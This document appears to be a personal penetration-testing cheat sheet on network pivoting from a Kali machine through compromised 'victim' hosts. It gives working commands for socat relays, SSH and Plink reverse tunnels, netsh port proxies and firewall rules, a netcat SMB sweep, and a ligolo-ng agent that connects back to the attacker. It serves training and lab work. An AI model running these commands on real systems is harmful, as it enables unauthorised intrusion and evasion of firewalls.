# Linux Port Forwarding
- look for subnet/dmz
- ``` ip route ```  | ``` ip addr ```
## Socat
- ``` socat TCP-LISTEN:2222,fork TCP:{ip}:22 ```

# SSH tunneling
  
## Local port fw 
- use 2 jump pad and go to target
- useful search port without nmap: ``` for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done ```
- kali -> victim 1 -> victim 2(10.4.xxx) -> victim3(172.16.xxx)
1. initate ssh tunneling in victim 1 ``` ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 ``` (No shell & )
2. check service if on victim 1``` ss -ntplu ```
 
## Dynamic port fw
- Enable proxychains in kali for more comfortability on ssh tun
1. ``` nano /etc/proxychains4.conf ``` with ``` socks5 {ip of ssh tun entrance} {port of ssh tun entrance} ```
2. run in victim ``` ssh -N -D 0.0.0.0:9999 database_admin@10.4.210.215 ``` 

## REMOTE local port fw
- prob cant go victim 3 with this method but can cure the problem of inbound firewall rule
- **Care** if connected 127.0.0.1/0.0.0.0 will become victim 1 && the the port will be used
1. host ssh server in kali: ``` sudo systemctl start ssh ``` (check: ``` sudo ss -ntplu ```)
2. run remote ssh fw in victim 1``` ssh -N -R 127.0.0.1:{port to be used in kali to connect this}:{victim2 ip}:5432 kali@{kali_ip} ```


## REMOTE dynamic port fw
- run this in victim 1 ``` ssh -N -R 9998 kali@192.168.118.4 ```
- edit proxychains conf ```  socks 127.0.0.1 9998```
- need to use proxychains as above in kali to run commands
- **care** about

## sshuttle
- need root & py3
1. run simple port forwarding in victim 1 : ``` socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 ```
2. ``` sshuttle -r database_admin@{victim 1 ip}:{victim 1} 10.4.50.0/24 172.16.50.0/24 {subnets}``` 
- works like vpn and setup 
- after success just hold there and keep running | sometimes may not receive much output

# Window Tool
## ssh.exe 
- Low probability have
- using cmd(not pwsh) to see ssh exist or not ``` where ssh ```
1. reverse REMOTE dynamic port ``` ssh -N -R 9998 kali@192.168.118.4 ``` (same as above)
- can use other ways too

## Plink (or Putty)
- Mid Prob
- Allow RDP connection for visual
- If blocked inbound from external and allow self fuck port then can use this way to start a REMOTE local port fw -> use rdp account u found to login thru this port

- Host apache / other python 80 web server to transfer
- Pull plink.exe (inside kali machine library @1.md) to victim
1. run in victim: ``` C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:{kali_port}:127.0.0.1:{to be binded port in victim} {kali ip} ```
2. kali: ``` xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833 ```

## Netsh 
- Requires ADMIN ROOT & CMD
- High Prob (since its network shell e.g. builtin firewal config tool is this)
  
### Simple forwarding
1. open 2222 on victim 1 to connect to victim 2 port 22``` netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.189.64 connectport=22 connectaddress=10.4.189.215 ``` (wont have response so need check with ``` netstat -anp TCP | find "2222" ``` OR ``` netsh interface portproxy show all ```)
  
### If filtered packet 
- Open firewall: ``` netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow ```

#### Clean up
- remove firewall rule ``` netsh advfirewall firewall delete rule name="port_forward_ssh_2222" ```
- remove port fwing ``` netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64 ```

#  ligolo-ng
- https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2
- https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5 
## Proxy (Kali) Setup
1. ``` 
    # Adds a new tun interface to our machine.
    sudo ip tuntap add user kali mode tun ligolo

    # Enables the new interface.
    sudo ip link set ligolo up
    ```
2. ```
    # With the -selfcert flag the tool dynamically 
    # generates self-signed certificates.

    ./proxy -selfcert
    ```
3. (After agent connected): ``` >>session >>start ```
   https://www.calculator.net/ip-subnet-calculator.html?cclass=any&csubnet=24&cip=172.16.184.254&ctype=ipv4&x=Calculate

4.  ```
    sudo ip route add 172.16.5.0/24 dev ligolo
    ```
5.  (Delete)
    ```
    sudo ip route remove 172.16.184.0/24
    ```

## Agent (Victim)
1. ```
    # The IP will be the IP of our Kali VM/attacking machine.
    # The -ignore-cert ignores certificate validation. 
    # This means we won't have any issues with our self-signed certs.

    ./agent -connect 10.10.14.213:11601 -ignore-cert
    ```
### Special Local forwarding 
- this tool has hardcoded ip 240.0.0.1 for accessing pivot host port
``` 
    sudo ip route add 240.0.0.1 dev ligolo
```